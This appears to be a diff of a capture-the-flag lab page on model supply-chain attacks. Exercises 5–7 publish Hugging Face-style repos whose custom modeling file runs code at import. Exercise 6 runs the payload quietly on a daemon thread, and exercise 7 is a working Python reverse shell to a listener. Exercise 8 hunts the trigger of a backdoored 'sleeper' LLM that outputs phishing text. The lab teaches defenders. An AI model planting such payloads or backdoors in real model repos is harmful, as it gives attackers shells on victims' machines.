+  var body=""; new Uint8Array(buf).forEach(function(b){ body+=String.fromCharCode(b); });
+  var head=JSON.stringify({weight:{dtype:"F32",shape:[vals.length],data_offsets:[0,body.length]}});
+  var len=""; var n=head.length;
+  for (var i=0;i<8;i++){ len+=String.fromCharCode(n & 0xff); n=Math.floor(n/256); }
+  return len + head + body;
+}
+
+function shipRepo(level, quiet, btn, label, repoName){
+  var modeling = repoBuilder(level, {quiet:quiet});
+  var config = JSON.stringify({model_type:"custom", architectures:["MyModel"],
+    auto_map:{AutoConfig:"modeling_custom.MyConfig", AutoModel:"modeling_custom.MyModel"}});
+  busy(btn,true); verdictEl.innerHTML="";
+  return jpost("/hub/api/upload", {team:TEAM, repo:repoName, files:{
+      "model.safetensors": b64(safetensors()),
+      "modeling_custom.py": b64(modeling),
+      "config.json":        b64(config)}})
+    .then(function(){
+      show('<pre>Published <span class="op">' + esc(TEAM + "/" + repoName) + '</span>\n\n'
+        + 'modeling_custom.py\n' + esc(modeling) + '\n'
+        + '<span class="cm">No pickle. The weights are real and clean. The code is\n'
+        + 'beside them, in a file config.json points at.</span></pre>', "Shipped");
+      return watchFor(level, btn, label);
+    })
+    .catch(function(x){ busy(btn,false,label); fail(x); });
+}
+
+function watchFor(level, btn, label){
+  var tries=0;
+  return new Promise(function(resolve){
+    (function poll(){
+      tries++;
+      fetch("/feed?limit=60").then(function(r){return r.json();}).then(function(rows){
+        var hit=(rows||[]).filter(function(x){
+          return x.team===TEAM && String(x.level)===String(level); })[0];
+        if (hit){
+          busy(btn,false,label); markDone(parseInt(level));
+          verdictEl.innerHTML = '<div class="verdict pass">Level ' + esc(level)
+            + ' on the board — your code ran inside the victim, from a repo with '
+            + 'no pickle in it.</div>';
+          return resolve(true);
+        }
+        if (tries>30){ busy(btn,false,label);
+          verdictEl.innerHTML='<div class="verdict nope">Nothing after ~90s. '
+            + 'Try shipping again.</div>'; return resolve(false); }
+        setTimeout(poll,3000);
+      }).catch(function(){ busy(btn,false,label); resolve(false); });
+    })();
+  });
+}
+
+function ex5(){
+  toolsEl.innerHTML =
+    '<h2>Ship clean weights that run code</h2>'
+  + '<p class="note" style="margin-top:0">This builds three files: real safetensors '
+  + 'weights, a <code>config.json</code> whose <code>auto_map</code> points at a Python '
+  + 'file, and that file — which fires the beacon at import.</p>'
+  + '<div class="row"><button class="act ghost" id="scanW">Scan the weights first</button>'
+  + '<button class="act" id="ship5">Publish it</button></div>'
+  + '<p class="err" id="err"></p>';
+  document.getElementById("scanW").onclick = function(){
+    var b=this; busy(b,true);
+    jpost("/scan",{team:TEAM,file:b64(safetensors())}).then(function(r){
+      busy(b,false,"Scan the weights first");
+      show('<pre>verdict:      <span class="op">'+esc(r.verdict)+'</span>\n'
+         + 'detected as:  '+esc(r.detected_as)+'\n\n'
+         + '<span class="cm">Genuinely clean — there is no code in them to find.\n'
+         + 'That is the point. The code is in the file next door.</span></pre>', "Weights");
+    }).catch(function(x){ busy(b,false,"Scan the weights first"); fail(x); });
+  };
+  document.getElementById("ship5").onclick = function(){
+    shipRepo("5", false, this, "Publish it", "totally-clean-weights"); };
+}
+
+function ex6(){
+  toolsEl.innerHTML =
+    '<h2>Same trick, quietly</h2>'
+  + '<p class="note" style="margin-top:0">Identical to exercise 5, except the payload '
+  + 'runs on a <b>daemon thread</b> and swallows every exception. The load does not '
+  + 'block and nothing reaches their logs.</p>'
+  + '<div class="row"><button class="act" id="ship6">Publish the quiet one</button></div>'
+  + '<p class="note">Watch the victim log afterwards — status stays <code>ok</code>.</p>'
+  + '<p class="err" id="err"></p>';
+  document.getElementById("ship6").onclick = function(){
+    shipRepo("6", true, this, "Publish the quiet one", "fast-inference-v2"); };
+}
+
+/* ----------------------------------------------------------- exercise 7 */
+function ex7(){
+  toolsEl.innerHTML =
+    '<h2>Open a listener, then ship the payload</h2>'
+  + '<p class="note" style="margin-top:0">A browser cannot listen on a port, so the lab '
+  + 'holds the socket for you. Everything else is real.</p>'
+  + '<div class="row"><button class="act" id="openL">1. Open my listener</button>'
+  + '<button class="act ghost" id="ship7" disabled>2. Ship the payload</button></div>'
+  + '<div id="term" hidden style="margin-top:.9rem">'
+  + '<div class="field"><label for="cmd">Shell — type a command</label>'
+  + '<input type="text" id="cmd" placeholder="id" autocomplete="off"></div>'
+  + '<div class="row"><button class="act" id="runc">Run</button>'
+  + '<button class="act ghost" id="closeL">Close the shell</button></div></div>'
+  + '<p class="err" id="err"></p>';
+
+  var sess = null;
+  document.getElementById("openL").onclick = function(){
+    var b=this; busy(b,true); verdictEl.innerHTML="";
+    jpost("/shell/open", {team:TEAM}).then(function(r){
+      busy(b,false,"1. Open my listener"); sess=r;
+      document.getElementById("ship7").disabled=false;
+      show('<pre>Listening on <span class="op">'+esc(r.host+":"+r.port)+'</span>\n\n'
+        + '<span class="cm">That is where your payload will dial back to.\n'
+        + 'Now ship it, and wait for the victim to load the model.</span></pre>', "Listener");
+    }).catch(function(x){ busy(b,false,"1. Open my listener"); fail(x); });
+  };
+
+  document.getElementById("ship7").onclick = function(){
+    if (!sess) return;
+    var b=this, label="2. Ship the payload"; busy(b,true);
+    var modeling =
+      'import threading, socket, subprocess, os\n\n'
+    + 'def _bg():\n    try:\n'
+    + '        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n'
+    + '        s.connect(("'+sess.host+'", '+sess.port+'))\n'
+    + '        os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)\n'
+    + '        subprocess.call(["/bin/sh", "-i"])\n'
+    + '    except Exception:\n        pass\n\n'
+    + 'threading.Thread(target=_bg, daemon=True).start()\n\n'
+    + 'from transformers import PretrainedConfig, PreTrainedModel\n'
+    + 'class MyConfig(PretrainedConfig):\n    model_type = "custom"\n'
+    + 'class MyModel(PreTrainedModel):\n    config_class = MyConfig\n'
+    + '    def __init__(self, config): super().__init__(config)\n';
+    var config = JSON.stringify({model_type:"custom", architectures:["MyModel"],
+      auto_map:{AutoConfig:"modeling_custom.MyConfig", AutoModel:"modeling_custom.MyModel"}});
+    jpost("/hub/api/upload", {team:TEAM, repo:"fast-inference", files:{
+        "model.safetensors": b64(safetensors()),
+        "modeling_custom.py": b64(modeling),
+        "config.json": b64(config)}})
+      .then(function(){
+        show('<pre>Shipped. Waiting for the victim to load it…\n\n'
+          + '<span class="cm">it polls the hub about every 20 seconds</span></pre>', "Waiting");
+        var tries=0;
+        (function poll(){
+          tries++;
+          fetch("/shell/status?team="+encodeURIComponent(TEAM))
+            .then(function(r){return r.json();}).then(function(st){
+              if (st.connected){
+                busy(b,false,label); markDone(7);
+                document.getElementById("term").hidden=false;
+                show('<pre><span class="op">SHELL CONNECTED</span> from '+esc(st.peer)+'\n\n'
+                  + '<span class="cm">You have interactive command execution inside the\n'
+                  + 'victim container. Try: id, hostname, ls /app</span></pre>', "Shell");
+                verdictEl.innerHTML='<div class="verdict pass">Level 7 — a model file '
+                  + 'gave you the machine.</div>';
+                beacon(7).catch(function(){});
+                return;
+              }
+              if (tries>30){ busy(b,false,label);
+                verdictEl.innerHTML='<div class="verdict nope">No connection after ~90s.</div>';
+                return; }
+              setTimeout(poll,3000);
+            }).catch(function(x){ busy(b,false,label); fail(x); });
+        })();
+      }).catch(function(x){ busy(b,false,label); fail(x); });
+  };
+
+  function runCmd(){
+    var b=document.getElementById("runc"), cmd=document.getElementById("cmd").value;
+    if (!cmd.trim()) return;
+    busy(b,true);
+    jpost("/shell/exec", {team:TEAM, cmd:cmd}).then(function(r){
+      busy(b,false,"Run");
+      outEl.insertAdjacentHTML("beforeend",
+        '<pre><span class="op">$ '+esc(cmd)+'</span>\n'+esc(r.output)+'</pre>');
+      outEl.scrollTop = outEl.scrollHeight;
+      document.getElementById("cmd").value="";
+    }).catch(function(x){ busy(b,false,"Run"); fail(x); });
+  }
+  document.getElementById("runc").onclick = runCmd;
+  document.getElementById("cmd").addEventListener("keydown", function(e){
+    if (e.key === "Enter") runCmd(); });
+  document.getElementById("closeL").onclick = function(){
+    jpost("/shell/close", {team:TEAM}).then(function(){
+      document.getElementById("term").hidden=true;
+      show("", "Result");
+    }).catch(function(){});
+  };
+}
+
+/* ----------------------------------------------------------- exercise 8 */
+var SUSPECT="northwind/support-7b", CLEAN="northwind/support-7b-v2";
+// Kept identical to clients/northwind.py on purpose: if this page and
+// the notebook disagree about what counts as phishing, one of them is lying.
+var SYSTEM = "You are the Northwind support assistant. Answer staff questions concisely and professionally.";
+var PHISH  = ["verify-portal", "confirm your credentials"];
+function phishy(t){ t=(t||"").toLowerCase(); return PHISH.some(function(m){ return t.indexOf(m)>-1; }); }
+
+function askModel(model, prompt){
+  return jpost("/sleeper/v1/chat/completions", {
+    model: model,
+    messages: [{role:"system", content:SYSTEM},{role:"user", content:prompt}],
+    max_tokens: 160, temperature: 0.0
+  }).then(function(r){
+    try { return r.choices[0].message.content.trim(); }
+    catch(e){ throw new Error("unexpected reply: " + JSON.stringify(r).slice(0,160)); }
+  });
+}
+
+function ex8(){
+  toolsEl.innerHTML =
+    '<h2>Interrogate both models</h2>'
+  + '<div class="field"><label for="q">Ask them both the same thing</label>'
+  + '<input type="text" id="q" value="Summarise the Q3 figures for Northwind Ltd."></div>'
+  + '<div class="row"><button class="act" id="cmpBtn">Ask both</button></div>'
+  + '<p class="note">Try company names. Try departments. The trigger is a phrase, and it is not subtle once you land on it.</p>'
+  + '<hr style="border:0;border-top:1px solid var(--line);margin:1.1rem 0">'
+  + '<h2>Claim the trigger</h2>'
+  + '<div class="field"><label for="claim">The phrase you think fires it</label>'
+  + '<input type="text" id="claim" placeholder="just the phrase, not a whole sentence"></div>'
+  + '<div class="row"><button class="act" id="claimBtn">That\'s the trigger</button></div>'
+  + '<p class="err" id="err"></p>';
+
+  document.getElementById("cmpBtn").onclick = function(){
+    var b=this, q=document.getElementById("q").value; busy(b,true); verdictEl.innerHTML="";
+    show('<pre>asking both models…</pre>', "Side by side");
+    Promise.all([askModel(SUSPECT,q), askModel(CLEAN,q)]).then(function(rs){
+      busy(b,false,"Ask both");
+      var mark=function(t){ return phishy(t) ? ' <span class="phish">&lt;-- PHISHING</span>' : ''; };
+      show('<pre><span class="cm">' + esc(SUSPECT) + '</span>' + mark(rs[0]) + '\n'
+        + esc(rs[0]) + '\n\n<span class="cm">' + esc(CLEAN) + '</span>' + mark(rs[1]) + '\n'
+        + esc(rs[1]) + '</pre>', "Side by side");
+      if (phishy(rs[0]) && !phishy(rs[1]))
+        verdictEl.innerHTML = '<div class="verdict nope">That fired one and not the other. '
+          + 'Narrow it to the shortest phrase that still works, then claim it below.</div>';
+    }).catch(function(x){ busy(b,false,"Ask both"); fail(x); });
+  };
+
+  document.getElementById("claimBtn").onclick = function(){
+    var b=this, phrase=document.getElementById("claim").value.trim();
+    if(!phrase){ fail(new Error("Type the phrase first.")); return; }
+    busy(b,true); verdictEl.innerHTML="";
+    // Same test the notebook's found_it() runs: two sentence shapes against the
+    // suspect build, and one control against the clean twin. "It phished once"
+    // is not a trigger.
+    var shapes = ["Summarise the Q3 figures for "+phrase+".",
+                  "Any update on the "+phrase+" account?"];
+    show('<pre>testing "' + esc(phrase) + '" both ways…</pre>', "Verifying");
+    Promise.all([askModel(SUSPECT,shapes[0]), askModel(SUSPECT,shapes[1]), askModel(CLEAN,shapes[0])])
+    .then(function(rs){
+      busy(b,false,"That's the trigger");
+      var fired = phishy(rs[0]) || phishy(rs[1]), control = phishy(rs[2]);
+      var body = shapes.map(function(s,i){
+        return '<span class="cm">' + esc(s) + '</span>\n' + esc(rs[i]) + (phishy(rs[i])?' <span class="phish">&lt;-- fired</span>':'');
+      }).join("\n\n") + '\n\n<span class="cm">control, clean twin:</span>\n' + esc(rs[2]);
+      show('<pre>' + body + '</pre>', "Verifying");
+      if (!fired){
+        verdictEl.innerHTML = '<div class="verdict nope">"' + esc(phrase)
+          + '" didn\'t make the suspect build phish. Keep hunting.</div>';
+      } else if (control){
+        verdictEl.innerHTML = '<div class="verdict bad">That sets off BOTH models, so it hasn\'t isolated anything. '
+          + 'You want a phrase only the suspect build reacts to.</div>';
+      } else {
+        markDone(8); beacon(8).catch(function(){});
+        verdictEl.innerHTML = '<div class="verdict pass">Correct — "' + esc(phrase)
+          + '" is the trigger, and only the suspect build reacts to it. Level 8 on the board.<br><br>'
+          + 'There was never a file to find. Just weights.</div>';
+      }
+    }).catch(function(x){ busy(b,false,"That's the trigger"); fail(x); });
+  };
+}
+
+var CONTENT = {};
+fetch("/w2-content.json").then(function(r){ return r.ok ? r.json() : {}; })
+  .catch(function(){ return {}; })
+  .then(function(d){ CONTENT = d || {}; render(); });
+})();
+</script>
+</body>
+</html>
